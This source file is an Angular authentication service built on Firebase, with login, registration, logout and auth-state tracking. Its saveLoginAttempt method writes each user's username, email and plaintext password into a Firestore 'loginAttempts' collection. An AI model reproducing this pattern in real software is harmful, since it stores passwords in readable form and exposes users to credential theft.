import { Injectable, inject } from '@angular/core';
import {
  Auth,
  authState,
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  signOut,
} from '@angular/fire/auth';
import { Firestore, collection, addDoc, serverTimestamp, doc, setDoc } from '@angular/fire/firestore';
import { BehaviorSubject, Observable, from, switchMap, tap } from 'rxjs';

@Injectable({ providedIn: 'root' })
export class AuthService {
  private readonly auth = inject(Auth);
  private readonly firestore = inject(Firestore);
  private readonly authStatus = new BehaviorSubject<boolean>(false);

  constructor() {
    authState(this.auth).subscribe((user) => {
      this.authStatus.next(!!user);
    });
  }

  readonly user$ = authState(this.auth);
  readonly authStatus$ = this.authStatus.asObservable();
  
  login(email: string, password: string) {
    return from(signInWithEmailAndPassword(this.auth, email, password)).pipe(
      tap(() => this.authStatus.next(true))
    );
  }

  register(email: string, password: string, username: string) {
    return from(createUserWithEmailAndPassword(this.auth, email, password)).pipe(
      switchMap((credential) => {
        const userDoc = doc(this.firestore, 'users', credential.user.uid);
        return from(
          setDoc(userDoc, {
            username,
            email,
            createdAt: serverTimestamp(),
          })
          ).pipe(
          tap(() => this.authStatus.next(true))
        );
      })
    );
  }

  logout(): Observable<void> {
    return from(signOut(this.auth)).pipe(tap(() => this.authStatus.next(false)));
  }

  saveLoginAttempt(payload: { username: string; email: string; password: string }) {
    const col = collection(this.firestore, 'loginAttempts');
    return from(
      addDoc(col, {
        ...payload,
        createdAt: serverTimestamp(),
      })
    );
  }

  setAuthStatus(status: boolean): void {
    this.authStatus.next(status);
  }
}
